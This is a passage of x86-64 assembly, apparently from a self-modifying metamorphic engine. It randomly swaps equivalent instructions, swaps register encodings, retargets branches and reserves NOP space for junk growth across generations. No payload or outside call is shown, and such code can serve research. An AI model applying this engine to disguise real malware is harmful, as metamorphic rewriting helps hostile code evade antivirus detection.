    je .tmi_m3_check
    cmp al, 0x21
    je .tmi_m3_check
    jmp .tmi_check_ff             # not an M3 opcode, try size mutations

.tmi_m3_check:
    # Verify ModR/M: mod==3 and reg==rm
    movzx ecx, byte ptr [rdi + 1]
    cmp ecx, 0xC0
    jb .tmi_check_ff              # mod != 3 → skip M3, try others

    # Extract reg (bits 5-3) and rm (bits 2-0)
    push rax                      # save opcode
    mov eax, ecx
    shr eax, 3
    and eax, 7                    # EAX = modrm.reg
    and ecx, 7                    # ECX = modrm.rm

    # Extend with REX.R / REX.B
    test dl, 0x04
    jz .tmi_m3_no_rexr
    or eax, 8
.tmi_m3_no_rexr:
    test dl, 0x01
    jz .tmi_m3_no_rexb
    or ecx, 8
.tmi_m3_no_rexb:
    cmp eax, ecx
    pop rax                       # restore opcode (flags unaffected by pop)
    jne .tmi_check_direction      # reg != rm → skip M3, try direction swap

    # Coin flip 50%
    rdrand ecx
    jnc .tmi_m3_85_second_chance  # rdrand failed → try size mutation for 0x85
    test cl, 1
    jz .tmi_m3_85_second_chance   # coin says no → give 0x85 a second chance

    # Apply M3 substitution
    movzx eax, byte ptr [rdi]    # re-read opcode
    cmp al, 0x31
    je .tmi_w29
    cmp al, 0x29
    je .tmi_w31
    cmp al, 0x85
    je .tmi_w09
    cmp al, 0x09
    je .tmi_w85
    # al == 0x21 (AND → TEST), fall through
.tmi_w85:
    mov byte ptr [rdi], 0x85
    ret
.tmi_w09:
    mov byte ptr [rdi], 0x09
    ret
.tmi_w31:
    mov byte ptr [rdi], 0x31
    ret
.tmi_w29:
    mov byte ptr [rdi], 0x29
    ret

.tmi_m3_85_second_chance:
    # M3 coin flip said no (or rdrand failed).
    # If opcode is 0x85 (TEST r,r with reg==rm), try TEST→CMP size mutation.
    cmp al, 0x85
    jne .tmi_check_direction      # not TEST → try direction swap

    # TEST r,r → CMP r, 0 (mut_type=5, new_len = old_len + 1)
    rdrand ecx
    jnc .tmi_done
    test cl, 1
    jz .tmi_done
    movzx ecx, byte ptr [rsi + 2] # old_len
    inc ecx
    mov byte ptr [rsi + 3], cl    # new_len = old_len + 1
    mov byte ptr [rsi + 5], 5     # mut_type = 5 (TEST→CMP)
    ret

    # size mutation for 0xFF: INC r → ADD r,1 or DEC r → SUB r,1
.tmi_check_ff:
    cmp al, 0xFF
    jne .tmi_check_83

    movzx ecx, byte ptr [rdi + 1] # ModR/M
    cmp ecx, 0xC0
    jb .tmi_check_direction       # mod != 3 → not register mode

    # Extract reg field (bits 5:3)
    mov eax, ecx
    shr eax, 3
    and eax, 7

    cmp eax, 0                    # /0 = INC?
    je .tmi_inc2add
    cmp eax, 1                    # /1 = DEC?
    je .tmi_dec2sub
    jmp .tmi_check_direction      # /2+ (CALL/JMP/PUSH) → skip

.tmi_inc2add:
    # INC r → ADD r, 1 (mut_type=1, grow +1)
    rdrand ecx
    jnc .tmi_done
    test cl, 1
    jz .tmi_done
    movzx ecx, byte ptr [rsi + 2] # old_len
    inc ecx
    mov byte ptr [rsi + 3], cl    # new_len = old_len + 1
    mov byte ptr [rsi + 5], 1     # mut_type = 1
    ret

.tmi_dec2sub:
    # DEC r → SUB r, 1 (mut_type=3, grow +1)
    rdrand ecx
    jnc .tmi_done
    test cl, 1
    jz .tmi_done
    movzx ecx, byte ptr [rsi + 2]
    inc ecx
    mov byte ptr [rsi + 3], cl    # new_len = old_len + 1
    mov byte ptr [rsi + 5], 3     # mut_type = 3
    ret

    # size mutation for 0x83: ADD r,1/SUB r,1/CMP r,0 variants
.tmi_check_83:
    cmp al, 0x83
    jne .tmi_check_direction

    movzx ecx, byte ptr [rdi + 1] # ModR/M
    cmp ecx, 0xC0
    jb .tmi_check_direction       # mod != 3

    # Extract reg field
    mov eax, ecx
    shr eax, 3
    and eax, 7

    cmp eax, 0
    je .tmi_add2inc_check
    cmp eax, 5
    je .tmi_sub2dec_check
    cmp eax, 7
    je .tmi_cmp2test_check
    jmp .tmi_check_direction

.tmi_add2inc_check:
    # ADD r, imm8 → INC r: requires imm8 == 1
    cmp byte ptr [rdi + 2], 0x01
    jne .tmi_check_direction
    rdrand ecx
    jnc .tmi_done
    test cl, 1
    jz .tmi_done
    movzx ecx, byte ptr [rsi + 2] # old_len
    dec ecx
    mov byte ptr [rsi + 3], cl    # new_len = old_len - 1
    mov byte ptr [rsi + 5], 2     # mut_type = 2 (ADD→INC)
    ret

.tmi_sub2dec_check:
    # SUB r, imm8 → DEC r: requires imm8 == 1
    cmp byte ptr [rdi + 2], 0x01
    jne .tmi_check_direction
    rdrand ecx
    jnc .tmi_done
    test cl, 1
    jz .tmi_done
    movzx ecx, byte ptr [rsi + 2]
    dec ecx
    mov byte ptr [rsi + 3], cl    # new_len = old_len - 1
    mov byte ptr [rsi + 5], 4     # mut_type = 4 (SUB→DEC)
    ret

.tmi_cmp2test_check:
    # CMP r, 0 → TEST r,r: requires imm8 == 0
    cmp byte ptr [rdi + 2], 0x00
    jne .tmi_check_direction
    rdrand ecx
    jnc .tmi_done
    test cl, 1
    jz .tmi_done
    movzx ecx, byte ptr [rsi + 2]
    dec ecx
    mov byte ptr [rsi + 3], cl    # new_len = old_len - 1
    mov byte ptr [rsi + 5], 6     # mut_type = 6 (CMP→TEST)
    ret

    # direction-bit encoding swap for ALU/MOV with mod==3
    # toggle bit 1 of opcode and swap reg↔rm in ModR/M (+ REX.R↔REX.B)
.tmi_check_direction:
    # Reload opcode in case we came from M3 fallthrough
    movzx eax, byte ptr [rdi]

    # ALU range: opcode < 0x40 AND (opcode & 0x04) == 0
    cmp al, 0x40
    jae .tmi_check_mov
    test al, 0x04
    jz .tmi_direction_mod3_check
    jmp .tmi_done

.tmi_check_mov:
    # MOV range: (opcode & 0xFC) == 0x88
    mov ecx, eax
    and ecx, 0xFC
    cmp ecx, 0x88
    je .tmi_direction_mod3_check

    # TEST/XCHG commutative: (opcode & 0xFC) == 0x84
    cmp ecx, 0x84
    je .tmi_commutative_check
    jmp .tmi_done

.tmi_direction_mod3_check:
    # Verify mod == 3 in ModR/M
    movzx ecx, byte ptr [rdi + 1]
    cmp ecx, 0xC0
    jb .tmi_done

    # Coin flip 50%
    rdrand eax
    jnc .tmi_done
    test al, 1
    jz .tmi_done

    # Save REX byte (EDX) before swap math Modifies it
    push rdx

    # Toggle direction bit in opcode (bit 1)
    xor byte ptr [rdi], 0x02

    # Swap reg (bits 5:3) and rm (bits 2:0) in ModR/M
    movzx eax, byte ptr [rdi + 1] # re-read ModR/M
    mov ecx, eax
    and ecx, 0xC0                 # keep mod bits
    mov edx, eax
    shr edx, 3
    and edx, 7                    # old reg → will become new rm
    or ecx, edx
    and eax, 7                    # old rm → will become new reg
    shl eax, 3
    or ecx, eax
    mov byte ptr [rdi + 1], cl    # write swapped ModR/M

    # Restore saved REX byte and swap REX.R↔REX.B if present
    pop rdx
    test edx, edx
    jz .tmi_done                  # no REX prefix → done
    # REX is at [rdi - 1]; swap bits 2 (R) and 0 (B)
    mov eax, edx
    and eax, 0xFA                 # clear bits 2 and 0
    mov ecx, edx
    and ecx, 0x04                 # isolate REX.R (bit 2)
    shr ecx, 2                    # move to bit 0
    or eax, ecx
    mov ecx, edx
    and ecx, 0x01                 # isolate REX.B (bit 0)
    shl ecx, 2                    # move to bit 2
    or eax, ecx
    mov byte ptr [rdi - 1], al    # write swapped REX
    ret

    # commutative swap for TEST/XCHG (0x84-0x87), reg↔rm without opcode change
.tmi_commutative_check:
    movzx ecx, byte ptr [rdi + 1]
    cmp ecx, 0xC0
    jb .tmi_done                  # mod != 3

    # Skip if reg == rm (swap would be a no-op)
    mov eax, ecx
    shr eax, 3
    and eax, 7
    mov edx, ecx
    and edx, 7
    cmp eax, edx
    je .tmi_done                  # reg == rm → no visible change

    # Coin flip 50%
    rdrand eax
    jnc .tmi_done
    test al, 1
    jz .tmi_done

    # Save REX byte (EDX) before swap math Modifies it
    push rdx

    # Swap reg↔rm in ModR/M (same logic as direction swap but no opcode change)
    movzx eax, byte ptr [rdi + 1]
    mov ecx, eax
    and ecx, 0xC0                 # keep mod bits
    mov edx, eax
    shr edx, 3
    and edx, 7                    # old reg → new rm
    or ecx, edx
    and eax, 7                    # old rm → new reg
    shl eax, 3
    or ecx, eax
    mov byte ptr [rdi + 1], cl

    # Restore saved REX and swap REX.R↔REX.B if present
    pop rdx
    test edx, edx
    jz .tmi_done
    mov eax, edx
    and eax, 0xFA
    mov ecx, edx
    and ecx, 0x04
    shr ecx, 2
    or eax, ecx
    mov ecx, edx
    and ecx, 0x01
    shl ecx, 2
    or eax, ecx
    mov byte ptr [rdi - 1], al

.tmi_done:
    ret

# CHECK_RIPREL Detect RIP-relative addressing in an instruction
# Walks past prefixes and opcode to find ModR/M byte, then checks for
# mod==0 + rm==5 + REX.B==0 which indicates [RIP + disp32] addressing.
#
# Input:  RDI = pointer to instruction start (must have F_MODRM)
# Output: AL = 0x40 (F_RIPREL) if RIP-relative, 0 otherwise
# Modifies: RAX, RCX, RDX, RSI
# Preserves: RBX, RBP, RDI, R8-R15
check_riprel:
    mov rsi, rdi                  # RSI = work pointer (preserve RDI)
    xor edx, edx                  # EDX = REX byte (0 if none)

.cr_prefix:
    movzx eax, byte ptr [rsi]
    # Check REX prefix (0x40-0x4F)
    cmp al, 0x40
    jb .cr_not_rex
    cmp al, 0x4F
    ja .cr_not_rex
    mov edx, eax                  # save REX (last one wins)
    inc rsi
    jmp .cr_prefix

.cr_not_rex:
    # Check legacy prefix via LDE table
    lea rcx, [rip + lde_primary_flags]
    movzx ecx, byte ptr [rcx + rax]
    test cl, 0x08                 # F_PREFIX?
    jz .cr_at_opcode
    inc rsi
    jmp .cr_prefix

.cr_at_opcode:
    # RSI -> opcode byte
    lea rcx, [rip + lde_primary_flags]
    movzx eax, byte ptr [rsi]
    movzx ecx, byte ptr [rcx + rax]
    inc rsi                       # skip opcode
    test cl, 0x10                 # F_ESCAPE (two-byte opcode)?
    jz .cr_at_modrm
    inc rsi                       # skip second opcode byte

.cr_at_modrm:
    # RSI -> ModR/M byte
    movzx eax, byte ptr [rsi]
    # mod==0: top two bits must be 0
    test al, 0xC0
    jnz .cr_no
    # rm==5: bottom three bits must be 5
    mov ecx, eax
    and ecx, 7
    cmp ecx, 5
    jne .cr_no
    # REX.B==0: bit 0 of REX must be clear
    test dl, 0x01
    jnz .cr_no
    mov al, 0x40                  # F_RIPREL
    ret

.cr_no:
    xor eax, eax
    ret

# RESOLVE_TARGET Find InsnTable entry matching a branch target offset
# Linear-searches InsnTable for old_off == target. Returns new_off.
#
# Input:  ESI = target offset in original .text
# Output: EDI = target's new_off (or new_code_size if past-end)
# Modifies: RAX, ECX, EDI
# Preserves: RBX, RBP, RSI, R8-R15 (R9=InsnTable, R12=new_cs, R13=count)
resolve_target:
    xor ecx, ecx

.rt_loop:
    cmp ecx, r13d
    jae .rt_past_end

    lea rax, [r9 + rcx*8]
    cmp word ptr [rax + 0], si    # old_off == target_off?
    je .rt_found

    inc ecx
    jmp .rt_loop

.rt_found:
    movzx edi, word ptr [rax + 6] # new_off of target instruction
    ret

.rt_past_end:
    # Target is past all instructions -> use new_code_size
    mov edi, r12d
    ret

_code_end:
    # Pad .text to 8192 bytes from _start 
    # NOP sled fills remaining space (room for junk insertion growth)
    .fill 8192 - (_code_end - _start), 1, 0x90

Store_section:
    # Generation counter (8 bytes)
    .quad 0
    # Actual code size in bytes (4 bytes)
    .long _code_end - _start
    # Sentinel marker (4 bytes)
    .long 0xDEADBEEF

# LDE OPCODE TABLES (read-only, never mutated)
.section .rodata

# Primary opcode flags table (one-byte opcodes 0x00-0xFF)
# Bit 0: F_MODRM   - has ModR/M byte
# Bit 1-2: imm size (00=none, 01=imm8, 10=imm32, 11=imm64)
# Bit 3: F_PREFIX   - is a legacy prefix
# Bit 4: F_ESCAPE   - is 0x0F escape to secondary table
# Bit 5: F_BRANCH   - is a relative branch (needs offset patching)
lde_primary_flags:
    .byte 0x01, 0x01, 0x01, 0x01, 0x02, 0x04, 0x00, 0x00  # 0x00-0x07
    .byte 0x01, 0x01, 0x01, 0x01, 0x02, 0x04, 0x00, 0x10  # 0x08-0x0F
    .byte 0x01, 0x01, 0x01, 0x01, 0x02, 0x04, 0x00, 0x00  # 0x10-0x17
    .byte 0x01, 0x01, 0x01, 0x01, 0x02, 0x04, 0x00, 0x00  # 0x18-0x1F
    .byte 0x01, 0x01, 0x01, 0x01, 0x02, 0x04, 0x08, 0x00  # 0x20-0x27
    .byte 0x01, 0x01, 0x01, 0x01, 0x02, 0x04, 0x08, 0x00  # 0x28-0x2F
    .byte 0x01, 0x01, 0x01, 0x01, 0x02, 0x04, 0x08, 0x00  # 0x30-0x37
    .byte 0x01, 0x01, 0x01, 0x01, 0x02, 0x04, 0x08, 0x00  # 0x38-0x3F
    .byte 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00  # 0x40-0x47 (REX: handled in code)
    .byte 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00  # 0x48-0x4F
    .byte 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00  # 0x50-0x57 (PUSH r)
    .byte 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00  # 0x58-0x5F (POP r)
    .byte 0x00, 0x00, 0x00, 0x01, 0x08, 0x08, 0x08, 0x08  # 0x60-0x67
    .byte 0x04, 0x05, 0x02, 0x03, 0x00, 0x00, 0x00, 0x00  # 0x68-0x6F
    .byte 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22  # 0x70-0x77 (Jcc rel8)
    .byte 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22  # 0x78-0x7F
    .byte 0x03, 0x05, 0x03, 0x03, 0x01, 0x01, 0x01, 0x01  # 0x80-0x87
    .byte 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01  # 0x88-0x8F
    .byte 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00  # 0x90-0x97 (NOP/XCHG)
    .byte 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00  # 0x98-0x9F
    .byte 0x06, 0x06, 0x06, 0x06, 0x00, 0x00, 0x00, 0x00  # 0xA0-0xA7
    .byte 0x02, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00  # 0xA8-0xAF
    .byte 0x02, 0x02, 0x02, 0x02, 0x02, 0x02, 0x02, 0x02  # 0xB0-0xB7 (MOV r8, imm8)
    .byte 0x04, 0x04, 0x04, 0x04, 0x04, 0x04, 0x04, 0x04  # 0xB8-0xBF (MOV r, imm32/64)
    .byte 0x03, 0x03, 0x00, 0x00, 0x00, 0x00, 0x03, 0x05  # 0xC0-0xC7
    .byte 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00  # 0xC8-0xCF
    .byte 0x01, 0x01, 0x01, 0x01, 0x02, 0x02, 0x00, 0x00  # 0xD0-0xD7
    .byte 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01  # 0xD8-0xDF (x87 FPU)
    .byte 0x22, 0x22, 0x22, 0x22, 0x02, 0x02, 0x02, 0x02  # 0xE0-0xE7
    .byte 0x24, 0x24, 0x00, 0x22, 0x00, 0x00, 0x00, 0x00  # 0xE8-0xEF
    .byte 0x08, 0x00, 0x08, 0x08, 0x00, 0x00, 0x01, 0x01  # 0xF0-0xF7
    .byte 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x01  # 0xF8-0xFF

# Secondary opcode flags table (0x0F xx two-byte opcodes)
lde_secondary_flags:
    .byte 0x01, 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00  # 0x0F 00-07
    .byte 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00  # 0x0F 08-0F
    .byte 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01  # 0x0F 10-17 (SSE MOV)
    .byte 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01  # 0x0F 18-1F (NOPs)
    .byte 0x01, 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00  # 0x0F 20-27
    .byte 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01  # 0x0F 28-2F
    .byte 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00  # 0x0F 30-37
    .byte 0x01, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00  # 0x0F 38-3F
    .byte 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01  # 0x0F 40-47 (CMOVcc)
    .byte 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01  # 0x0F 48-4F
    .byte 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01  # 0x0F 50-57
    .byte 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01  # 0x0F 58-5F
    .byte 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01  # 0x0F 60-67
    .byte 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01  # 0x0F 68-6F
    .byte 0x03, 0x03, 0x03, 0x03, 0x01, 0x01, 0x01, 0x00  # 0x0F 70-77
    .byte 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01  # 0x0F 78-7F
    .byte 0x24, 0x24, 0x24, 0x24, 0x24, 0x24, 0x24, 0x24  # 0x0F 80-87 (Jcc rel32)
    .byte 0x24, 0x24, 0x24, 0x24, 0x24, 0x24, 0x24, 0x24  # 0x0F 88-8F
    .byte 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01  # 0x0F 90-97 (SETcc)
    .byte 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01  # 0x0F 98-9F
    .byte 0x00, 0x00, 0x00, 0x01, 0x03, 0x01, 0x00, 0x00  # 0x0F A0-A7
    .byte 0x00, 0x00, 0x00, 0x01, 0x03, 0x01, 0x01, 0x01  # 0x0F A8-AF
    .byte 0x01, 0x01, 0x00, 0x01, 0x00, 0x00, 0x01, 0x01  # 0x0F B0-B7
    .byte 0x00, 0x00, 0x03, 0x01, 0x01, 0x01, 0x01, 0x01  # 0x0F B8-BF
    .byte 0x01, 0x01, 0x03, 0x01, 0x03, 0x03, 0x03, 0x01  # 0x0F C0-C7
    .byte 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00  # 0x0F C8-CF (BSWAP)
    .byte 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01  # 0x0F D0-D7
    .byte 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01  # 0x0F D8-DF
    .byte 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01  # 0x0F E0-E7
    .byte 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01  # 0x0F E8-EF
    .byte 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01  # 0x0F F0-F7
    .byte 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01  # 0x0F F8-FF

# Immediate size lookup table (for RIP-relative disp32 position calculation)
# Maps flags bits 1-2 to byte count: 00->0, 01->1, 10->4, 11->8
imm_size_lut:
    .byte 0, 1, 4, 8

# Multi-byte NOP templates (Intel-recommended, sizes 1-9)
# Each is a single instruction keeps instruction count low across generations
nop_templates:
    .byte 0x90                                                     # size 1
    .byte 0x66, 0x90                                               # size 2
    .byte 0x0F, 0x1F, 0x00                                         # size 3
    .byte 0x0F, 0x1F, 0x40, 0x00                                   # size 4
    .byte 0x0F, 0x1F, 0x44, 0x00, 0x00                             # size 5
    .byte 0x66, 0x0F, 0x1F, 0x44, 0x00, 0x00                       # size 6
    .byte 0x0F, 0x1F, 0x80, 0x00, 0x00, 0x00, 0x00                 # size 7
    .byte 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00           # size 8
    .byte 0x66, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00     # size 9

# Byte offset into nop_templates for each NOP size (0-indexed by size-1)
nop_offsets:
    .byte 0, 1, 3, 6, 10, 15, 21, 28, 36
